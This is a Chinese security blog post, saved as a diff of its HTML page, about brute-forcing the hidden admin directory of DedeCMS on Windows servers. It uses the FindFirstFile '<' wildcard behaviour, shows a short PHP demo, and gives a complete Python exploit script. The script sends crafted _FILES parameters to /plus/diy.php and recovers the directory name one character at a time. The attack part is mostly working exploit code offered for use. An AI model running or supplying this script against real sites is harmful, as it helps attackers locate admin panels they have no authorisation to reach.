@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>dede 后台爆破 | X1r0z Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="在 Windows 里, 我们只需要知道文件所在目录, 通过 FindFirstFile winapi 函数就可以访问到文件.  Example123456789101112131415161718192021&amp;lt;?php// ./dedecms/favicon.icoif(@getimagesize($_GET[&amp;apos;poc&amp;apos;]))&amp;#123;    echo 1;&amp;#12">
+<meta name="keywords" content="exploit,dede">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dede 后台爆破">
+<meta property="og:url" content="https://exp10it.cn/2018/03/03/dede-directory-brute-exp/index.html">
+<meta property="og:site_name" content="X1r0z Blog">
+<meta property="og:description" content="在 Windows 里, 我们只需要知道文件所在目录, 通过 FindFirstFile winapi 函数就可以访问到文件.  Example123456789101112131415161718192021&amp;lt;?php// ./dedecms/favicon.icoif(@getimagesize($_GET[&amp;apos;poc&amp;apos;]))&amp;#123;    echo 1;&amp;#12">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-08-02T03:01:41.549Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="dede 后台爆破">
+<meta name="twitter:description" content="在 Windows 里, 我们只需要知道文件所在目录, 通过 FindFirstFile winapi 函数就可以访问到文件.  Example123456789101112131415161718192021&amp;lt;?php// ./dedecms/favicon.icoif(@getimagesize($_GET[&amp;apos;poc&amp;apos;]))&amp;#123;    echo 1;&amp;#12">
+  
+    <link rel="alternate" href="/atom.xml" title="X1r0z Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/plugin/images/avatar.jpg">
+    <h2 class="author">X1r0z</h2>
+    <h3 class="description">剑之所指, 心之所向</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>97</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>10</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>54</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+          <a href="/about" title="About">
+            <li>关于</li>
+          </a>
+        
+          <a href="/project" title="Project">
+            <li>项目</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-dede-directory-brute-exp" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/03/03/dede-directory-brute-exp/" class="article-date">
+  <time class="post-time" datetime="2018-03-02T16:00:00.000Z" itemprop="datePublished">
+    <span class="post-month">3月</span><br/>
+    <span class="post-day">03</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      dede 后台爆破
+    </h1>
+  
+
+        <div>
+          
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/cms-vul/">cms-vul</a>
+  </div>
+
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>在 Windows 里, 我们只需要知道文件所在目录, 通过 FindFirstFile winapi 函数就可以访问到文件.</p>
+</blockquote>
+<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// ./dedecms/favicon.ico</span><br><span class="line">if(@getimagesize($_GET[&apos;poc&apos;]))&#123;</span><br><span class="line">    echo 1;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    echo 0;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">get:</span><br><span class="line">http://localhost/test.php?poc=./d&lt;/favicon.ico</span><br><span class="line">返回: 1</span><br><span class="line"></span><br><span class="line">http://localhost/test.php?poc=./a&lt;/favicon.ico</span><br><span class="line">返回: 0</span><br><span class="line"></span><br><span class="line">http://localhost/test.php?poc=./de&lt;/favicon.ico</span><br><span class="line">返回: 1</span><br><span class="line"></span><br><span class="line">http://localhost/test.php?poc=./ded&lt;/favicon.ico</span><br><span class="line">返回: 1</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>前两位需要爆破 会花一点时间</p>
+<p>只适用于 windows 系统</p>
+<h3 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import itertools</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def dede_brute(url):</span><br><span class="line">    characters = &apos;abcdefghijklmnopqrstuvwxyz0123456789_!~@$-+=()&apos;</span><br><span class="line">    back_dir = &apos;&apos;</span><br><span class="line">    flag = 0</span><br><span class="line">    url = url + &apos;/plus/diy.php&apos;</span><br><span class="line">    data = &#123;</span><br><span class="line">        &apos;_FILES[dede][tmp_name]&apos; : &apos;./../&#123;p&#125;&lt;&lt;/images/adminico.gif&apos;,</span><br><span class="line">        &apos;_FILES[dede][name]&apos; : 0,</span><br><span class="line">        &apos;_FILES[dede][size]&apos; : 0,</span><br><span class="line">        &apos;_FILES[dede][type]&apos; : &apos;image/gif&apos;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for num in range(1,7):</span><br><span class="line">        if flag:</span><br><span class="line">            break</span><br><span class="line">        for pre in itertools.permutations(characters,num):</span><br><span class="line">            pre = &apos;&apos;.join(list(pre))</span><br><span class="line">            data[&apos;_FILES[dede][tmp_name]&apos;] = data[&apos;_FILES[dede][tmp_name]&apos;].format(p=pre)</span><br><span class="line">            print &apos;[*] testing&apos;,pre</span><br><span class="line">            r = requests.post(url,data=data)</span><br><span class="line">            if &apos;Upload filetype not allow !&apos; not in r.text and r.status_code == 200:</span><br><span class="line">                flag = 1</span><br><span class="line">                back_dir = pre</span><br><span class="line">                data[&apos;_FILES[dede][tmp_name]&apos;] = &apos;./../&#123;p&#125;&lt;&lt;/images/adminico.gif&apos;</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                data[&apos;_FILES[dede][tmp_name]&apos;] = &apos;./../&#123;p&#125;&lt;&lt;/images/adminico.gif&apos;</span><br><span class="line"></span><br><span class="line">    print &apos;[+] prefix:&apos;,back_dir</span><br><span class="line">    flag = 0</span><br><span class="line"></span><br><span class="line">    for i in range(30):</span><br><span class="line">        if flag:</span><br><span class="line">            break</span><br><span class="line">        for ch in characters:</span><br><span class="line">            if ch == characters[-1]:</span><br><span class="line">                flag = 1</span><br><span class="line">                break</span><br><span class="line">            data[&apos;_FILES[dede][tmp_name]&apos;] = data[&apos;_FILES[dede][tmp_name]&apos;].format(p=back_dir+ch)</span><br><span class="line">            r = requests.post(url, data=data)</span><br><span class="line">            if &apos;Upload filetype not allow !&apos; not in r.text and r.status_code == 200:</span><br><span class="line">                back_dir += ch</span><br><span class="line">                print &apos;[+] &apos;,back_dir</span><br><span class="line">                data[&apos;_FILES[dede][tmp_name]&apos;] = &apos;./../&#123;p&#125;&lt;&lt;/images/adminico.gif&apos;</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                data[&apos;_FILES[dede][tmp_name]&apos;] = &apos;./../&#123;p&#125;&lt;&lt;/images/adminico.gif&apos;</span><br><span class="line"></span><br><span class="line">    print &apos;[+] path:&apos;,back_dir</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    if len(sys.argv) == 2:</span><br><span class="line">        dede_brute(sys.argv[1])</span><br><span class="line">    else:</span><br><span class="line">        print &apos;[*] usage: dede.py url&apos;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://exp10it.cn/2018/03/03/dede-directory-brute-exp/" data-id="cjkbzjdjw002qbqnt346on82b" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/dede/">dede</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/exploit/">exploit</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/03/04/memcached-udp-reflex-attack/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">上一篇</strong>
+      <div class="article-nav-title">
+        
+          Memcached UDP 反射攻击
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/02/24/msf-webshell/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">下一篇</strong>
+      <div class="article-nav-title">msf webshell 提权</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">X1r0z Blog</h1>
+    <h2 class="blog-subtitle">剑之所指, 心之所向</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+          <a href="/about" title="About">
+            <li>关于</li>
+          </a>
+        
+          <a href="/project" title="Project">
+            <li>项目</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="/plugin/images/avatar.jpg">
+    <h2 class="author">X1r0z</h2>
+    <h3 class="description">剑之所指, 心之所向</h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>97</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>10</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>54</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="https://github.com/X1r0z" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友情链接</h2>
+      
+        <a class="hvr-bounce-in" href="https://chabug.org/" target="_blank" title="ChaBug">
+          ChaBug
+        </a>
+      
+        <a class="hvr-bounce-in" href="http://blog.dyboy.cn/" target="_blank" title="DYBOY">
+          DYBOY
+        </a>
+      
+        <a class="hvr-bounce-in" href="https://exp10it.cn/" target="_blank" title="超级无敌宇宙大帅比">
+          超级无敌宇宙大帅比
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2017 - 2018 X1r0z<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
+  <script src="/plugin/galmenu/GalMenu.js"></script>
+  <div class="GalMenu GalDropDown">
+      <div class="circle" id="gal">
+        <div class="ring">
+          
+            <a href="/" title="" class="menuItem">首页</a>
+          
+            <a href="/tags" title="" class="menuItem">标签</a>
+          
+            <a href="/categories" title="" class="menuItem">分类</a>
+          
+            <a href="/archives" title="" class="menuItem">归档</a>
+          
+            <a href="/about" title="" class="menuItem">关于</a>
+          
+            <a href="/project" title="" class="menuItem">项目</a>
+          
+        </div>
+        
+          <audio id="audio" src="plugin/galmenu/wulusai.mp3"></audio>
+        
+      </div> 
+</div>
+<div id="overlay" style="opacity: 1; cursor: pointer;"></div>
+  <script type="text/javascript">var items = document.querySelectorAll('.menuItem');
+    for (var i = 0,
+    l = items.length; i < l; i++) {
+      items[i].style.left = (50 - 35 * Math.cos( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%";
+      items[i].style.top = (50 + 35 * Math.sin( - 0.5 * Math.PI - 2 * (1 / l) * i * Math.PI)).toFixed(4) + "%"
+    }</script>
+<script type="text/javascript">
+  $(document).ready(function() {
+    $('body').GalMenu({
+      'menu': 'GalDropDown'
+    })
+  });
+</script>
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
